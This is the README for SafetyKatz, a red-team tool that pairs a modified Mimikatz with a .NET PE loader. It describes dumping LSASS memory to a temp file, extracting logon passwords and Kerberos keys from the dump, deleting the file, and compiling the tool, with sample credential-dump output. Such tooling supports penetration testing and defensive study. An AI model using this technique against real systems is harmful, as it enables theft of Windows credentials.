# SafetyKatz

----

SafetyKatz is a combination of slightly modified version of [@gentilkiwi](https://twitter.com/gentilkiwi)'s [Mimikatz](https://github.com/gentilkiwi/mimikatz/) project and [@subtee](https://twitter.com/subtee)'s [.NET PE Loader](https://github.com/re4lity/subTee-gits-backups/blob/master/PELoader.cs).

First, the [MiniDumpWriteDump](https://docs.microsoft.com/en-us/windows/desktop/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump) Win32 API call is used to create a minidump of LSASS to C:\Windows\Temp\debug.bin. Then @subtee's PELoader is used to load a customized version of Mimikatz that runs
**sekurlsa::logonpasswords** and **sekurlsa::ekeys** on the minidump file, removing the file after execution is complete.

#### Modifications

* @subtee's PE Loader was slightly modified so some of the pointer arithmetic worked better on .NET 3.5
* @gentilkiwi's Mimikatz project was modified to strip some functionality for size reasons, and to automatically run the sekurlsa::minidump mode (deleting the minidump file after). If you don't trust my compiled version, feel free to build it yourself :)


[@harmj0y](https://twitter.com/harmj0y) is the primary author of this port.

SafetyKatz is licensed under the BSD 3-Clause license.

## Usage

    C:\Temp>SafetyKatz.exe

    [*] Dumping lsass (808) to C:\WINDOWS\Temp\debug.bin
    [+] Dump successful!

    [*] Executing loaded Mimikatz PE

    .#####.   mimikatz 2.1.1 (x64) built on Jul  7 2018 03:36:26 - lil!
    .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
    ## / \ ##  / *** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
    ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
    '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
    '#####'        > http://pingcastle.com / http://mysmartlogon.com   *** /

    mimikatz # Opening : 'C:\Windows\Temp\debug.bin' file for minidump...

    Authentication Id : 0 ; 28935082 (00000000:01b983aa)
    Session           : Interactive from 0
    User Name         : blahuser
    Domain            : WINDOWS10
    Logon Server      : WINDOWS10
    Logon Time        : 7/15/2018 1:07:55 PM
    SID               : S-1-5-21-1473254003-2681465353-4059813368-1002
            msv :
            [00000003]
    Primary
            * Username : blahuser
            * Domain   : WINDOWS10

    ...(snip)...

    mimikatz # deleting C:\Windows\Temp\debug.bin


## Compile Instructions

We are not planning on releasing binaries for SafetyKatz, so you will have to compile yourself :)

SafetyKatz has been built against.NET 3.5 and is compatible with[Visual Studio 2015 Community Edition](https://go.microsoft.com/fwlink/?LinkId=532606&clcid=0x409). Simply open up the project .sln, choose "release", and build.
